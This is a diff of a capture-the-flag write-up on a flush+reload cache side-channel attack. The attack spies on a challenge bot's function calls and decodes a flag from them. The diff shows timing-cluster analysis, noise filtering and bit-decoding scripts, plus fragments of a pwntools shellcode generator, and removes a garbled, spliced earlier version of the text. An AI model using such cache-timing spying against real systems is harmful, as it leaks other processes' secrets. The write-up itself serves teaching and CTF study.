@@ -180,125 +180,14 @@ A key feature of the side-channel cache attack is that there is a period of wait
 ![Side-channel cache attack timing image](https://github.com/HAM3131/pictures/blob/main/side-channel_cache_attack_timing.png?raw=true)
 Because of this, and because we know from the bot script provided as a part of the challenge that the bot takes actions at 0.25s intervals, we were initially waiting a quarter second between each flush+reload. However, this method gave us the same results whether we flushed the memory or not, which indicated that whether we did it manually or not, the memory we were inspecting was being flushed from the cache, even after the victim process performed an action. This is because there are other processes, including the operating system, working in the cache. And, given enough time, the memory will always be flushed from the cache. So, we needed to inspect *much* shorter time intervals.
 
-### Hit "Cluster" Analysis
-Since we are now checking each function at small intervals, we will get a "hit" (meaning the bot accessed the memory and placed it in the cache) multiple times for every time the bot performs an action. This was a challenge, but also a useful tool. Occasionally, due to the nature of this attack, false positives occur. However, they happen rarely, and they occur independently of one another. Thus, we knew that the true readings occurred when many rapid hits were read.
-
-Below is our python script, which takes in a list ``results`` of the exact *time* each reading is made, filters for clusters, rewrites each as the difference from the first cluster, and then multiplies them by scaling factor which we found experimentally to be **0.9947** (the bot does not do actions at exactly 0.25 second intervals). 
-
-```python
-currentGroup = []
-groupMeans = []
-for x in results:
-	if len(currentGroup) > 0:
-		if x - currentGroup[-1] < 0.05:
-			currentGroup.append(x)
-		else:
-			if len(currentGroup) > 1:
-				groupMeans.append(mean(currentGroup))
-			currentGroup = [x]
-	else:
-		currentGroup.append(x)
-baseValue = groupMeans[0]
-groupMeans = [(y-baseValue)*.9947  for y in groupMeans]
-```
-Next, we organize these mean cluster times by rounding them to the 0.25 second intervals which we know the bot does actions.
-```python
-returnVals = []
-for x in groupMeans:
-	returnVals.append(math.floor((x-groupMeans[1])*4+0.5)-math.floor((groupMeans[0]-groupMeans[1])*4+0.5))
-```
-This gives us, for the readings at a specific memory location, the exact 0.25 second intervals in which this location was accessed.
-![flag_sharing_](https://github.com/HAM3131/pictures/blob/main/flag_sharing_.png?raw=true)
-Here you can see the process in action. The raw data (Raw Reading) is first analyzed to get scaled means of the clusters (Cluster Average) and then aligned to 0.25 second intervals (Rounded Time).
-### Inaccurate Data
-
-Due to the nature of this method of attack, there are infrequent, but nonetheless present, inaccuracies. Thus, it is best practice to take *several* readings (3-5) for each of the four functions. Our "probing" program simply saved the data as a CSV, with the first value in each row being the label (0-3) of which function was read, and the rest being the 0.25 interval (0, 1, 5, 9, 10... for example). We then formulated an algorithm that simply took this data, and took the datapoints agreed upon by the majority of the results, as can be seen below.
-```python
-# Reads in data CSV
-past_data = []
-with open('flush_data.csv', 'r') as csv_file:
-	reader = csv.reader(csv_file)
-	for row in reader:
-		past_data.append(row)
-
-# Takes data which is "agreed upon" by most of the dataset (to cancel out noise)
-# Only run when having at least 3 samples that seem to agree on >90% of data points
-# Occasionally a sample is deeply incorrect (doesnt match any other samples).
-# You can manually spot this and delete that sample, or ignore and collect more data so
-stepResults = {}
-for STEP in range(4):
-	steps_mode_vals = []
-	for x in range(500):
-		seen = 0
-		totalReads = 0
-		for pad in past_data:
-			if pad[0] == str(STEP):
-				print(STEP)
-				totalReads += 1
-				if str(x) in pad[1:]:
-					seen += 1
-		if totalReads > 0  and seen/totalReads >= 0.5:
-			steps_mode_vals.append(x)
-	stepResults[STEP] = steps_mode_vals
-```
-
-### Double Hits
-The last problem we faced was double accessing of memory. Since we were able to test "fake flags" with known bot actions, it was very quickly realized that often when a bot accesses the memory for `move_left` associated with ``01``, for example, it also accessed the memory for `move_right` associated with ``11``.
-
-How do we combat this? Well, we found rather quickly that each function call still had a unique *pair* which our spy would see. For example, if we read a ``move_right`` *and* a `move_up`, we knew that would only occur if `move_right` had been called. This can be seen in this diagram, of the true readings we got from 3 characters of the flag.
-![flag_sharing_filtered_results](https://github.com/HAM3131/pictures/blob/main/flag_sharing_filtered_results.png?raw=true)
-* Note that, due to how the bot reads the flag, the bit pairs in each character are read in *little* endian, and thus are "backwards" of how one would generally read them. This cost me at least 2 hours of my life, despite being painfully obvious.
-
-Conveniently, the "double" hits do not affect our ability to read the flag from the data at all.
-
-Here you can see the Python algorithm we crafted to do this reading and output the flag.
-```python
-# Takes results and turns into text, taking into account the fact that:
-# 10 -> 3
-# 00 -> 2, 3
-# 11 -> 1, 2
-# 01 -> 0, 1
-binaryList = []
-for i in range(100):
-	bString = ""
-	for j in range(4):
-		if i*4+j in trueValues.keys():
-			theList = trueValues[i*4+j]
-			if  0  in theList:
-				bString = "01" + bString
-			elif  1  in theList:
-				bString = "11" + bString
-			elif  2  in theList:
-				bString = "00" + bString
-			else:
-				bString = "10" + bString
-		else:
-			break
-	if len(bString) == 8:
-		binaryList.append(int(bString, 2))
-print(bytes(binaryList))
-```
-
-## Putting it all Together
-Thus, in the end, we had three Python scripts.
-* One which probes the flag, filters the probed data, and adds it to the saved data
-* One which that probe uses to generate machine code to probe the flag
-* And onmain/flag_sharing_filtered_results.png?raw=true)
-* Note that each character in the flag is read in *big endian* order
-
-Rather beautifully, despite these "double which take the saved probing data and analyze it to find the flag
-
-First, the data is probed multiple times by the user (us!) for each of the three functions, until satisfactory amounts of data is read. Then, the data is analyzed and the flag is produced.
-
-For the sake of completion (and our hard work), when all is said and done, our program outputted for us
-```python
-b'{y0u_h4v3_b33n_f1ag_5h4r1ng_th1s_ent1r3_t1me???}\n'
-```
-also known as the FLAG!ts," we can uniquely identify each
-
-
 ## Solve
 
+So, we create three python scripts.
+* One which is used to generate machine code to probe the flag
+* One which probes the flag, filters the probed data, and adds it to the saved data
+* And one which analyzes the saved data and produces the flag
+
+### Payload generation
 Below is the code used to generate a machine code payload. It takes a `pwntools` `ELF` object as a parameter, and an offset `pVal` to determine the offset of the function to look at form the return address we grab. This function is used a few times to spy on each of the functions individually. Then, we compile that data to get a clear picture of the bot's actions. The code is commented to describe the purpose of each action, but for more information on any of these assembly functions or methods used, most of them are described above.
 
 ```python
@@ -382,3 +271,112 @@ def  final_payload(EXE, pVal): # print a "\ntime:\t" prefix
 	shellcode += shellcraft.amd64.exit(0) # Exit
 	return asm(shellcode)
 ```
+
+### Hit "Cluster" Analysis
+Since we are now checking each function at small intervals, we will get a "hit" (meaning the bot accessed the memory and placed it in the cache) multiple times for every time the bot performs an action. This was a challenge, but also a useful tool. Occasionally, due to the nature of this attack, false positives occur. However, they happen rarely, and they occur independently of one another. Thus, we knew that the true readings occurred when many rapid hits were read.
+
+Below is our python script, which takes in a list ``results`` of the exact *time* each reading is made, filters for clusters, rewrites each as the difference from the first cluster, and then multiplies them by scaling factor which we found experimentally to be **0.9947** (the bot does not do actions at exactly 0.25 second intervals). 
+
+```python
+currentGroup = []
+groupMeans = []
+for x in results:
+	if len(currentGroup) > 0:
+		if x - currentGroup[-1] < 0.05:
+			currentGroup.append(x)
+		else:
+			if len(currentGroup) > 1:
+				groupMeans.append(mean(currentGroup))
+			currentGroup = [x]
+	else:
+		currentGroup.append(x)
+baseValue = groupMeans[0]
+groupMeans = [(y-baseValue)*.9947  for y in groupMeans]
+```
+Next, we organize these mean cluster times by rounding them to the 0.25 second intervals which we know the bot does actions.
+```python
+returnVals = []
+for x in groupMeans:
+	returnVals.append(math.floor((x-groupMeans[1])*4+0.5)-math.floor((groupMeans[0]-groupMeans[1])*4+0.5))
+```
+This gives us, for the readings at a specific memory location, the exact 0.25 second intervals in which this location was accessed.
+![flag_sharing_](https://github.com/HAM3131/pictures/blob/main/flag_sharing_sorting_alg.png?raw=true)
+Here you can see the process in action. The raw data (Raw Reading) is first analyzed to get scaled means of the clusters (Cluster Average) and then aligned to 0.25 second intervals (Rounded Time).
+
+### Filtering Inaccurate Data
+
+Due to the nature of this method of attack, there are infrequent, but nonetheless present, inaccuracies. Thus, it is best practice to take *several* readings (3-5) for each of the four functions. Our "probing" program simply saved the data as a CSV, with the first value in each row being the label (0-3) of which function was read, and the rest being the 0.25 interval (0, 1, 5, 9, 10... for example). We then formulated an algorithm that simply took this data, and took the datapoints agreed upon by the majority of the results, as can be seen below.
+```python
+# Reads in data CSV
+past_data = []
+with open('flush_data.csv', 'r') as csv_file:
+	reader = csv.reader(csv_file)
+	for row in reader:
+		past_data.append(row)
+
+# Takes data which is "agreed upon" by most of the dataset (to cancel out noise)
+# Only run when having at least 3 samples that seem to agree on >90% of data points
+# Occasionally a sample is deeply incorrect (doesnt match any other samples).
+# You can manually spot this and delete that sample, or ignore and collect more data so
+stepResults = {}
+for STEP in range(4):
+	steps_mode_vals = []
+	for x in range(500):
+		seen = 0
+		totalReads = 0
+		for pad in past_data:
+			if pad[0] == str(STEP):
+				print(STEP)
+				totalReads += 1
+				if str(x) in pad[1:]:
+					seen += 1
+		if totalReads > 0  and seen/totalReads >= 0.5:
+			steps_mode_vals.append(x)
+	stepResults[STEP] = steps_mode_vals
+```
+
+### Double Hits
+The last problem we faced was double accessing of memory. Since we were able to test "fake flags" with known bot actions, it was very quickly realized that often when a bot accesses the memory for `move_left` associated with ``01``, for example, it also accessed the memory for `move_right` associated with ``11``.
+
+How do we combat this? Well, we found rather quickly that each function call still had a unique *pair* which our spy would see. For example, if we read a ``move_right`` *and* a `move_up`, we knew that would only occur if `move_right` had been called. This can be seen in this diagram, of the true readings we got from 3 characters of the flag.
+![flag_sharing_filtered_results](https://github.com/HAM3131/pictures/blob/main/flag_sharing_filtered_results.png?raw=true)
+* Note that, due to how the bot reads the flag, the bit pairs in each character are read in *little* endian, and thus are "backwards" of how one would generally read them. This cost me at least 2 hours of my life, despite being painfully obvious.
+
+Conveniently, the "double" hits do not affect our ability to read the flag from the data at all.
+
+Here you can see the Python algorithm we crafted to do this reading and output the flag.
+```python
+# Takes results and turns into text, taking into account the fact that:
+# 10 -> 3
+# 00 -> 2, 3
+# 11 -> 1, 2
+# 01 -> 0, 1
+binaryList = []
+for i in range(100):
+	bString = ""
+	for j in range(4):
+		if i*4+j in trueValues.keys():
+			theList = trueValues[i*4+j]
+			if  0  in theList:
+				bString = "01" + bString
+			elif  1  in theList:
+				bString = "11" + bString
+			elif  2  in theList:
+				bString = "00" + bString
+			else:
+				bString = "10" + bString
+		else:
+			break
+	if len(bString) == 8:
+		binaryList.append(int(bString, 2))
+print(bytes(binaryList))
+```
+
+## Putting it all Together
+First, the data is probed multiple times by the user (us!) for each of the three functions, until satisfactory amounts of data is read. Then, the data is analyzed and the flag is produced.
+
+For the sake of completion (and our hard work), when all is said and done, our program outputted for us
+```python
+b'{y0u_h4v3_b33n_f1ag_5h4r1ng_th1s_ent1r3_t1me???}\n'
+```
+also known as the FLAG!
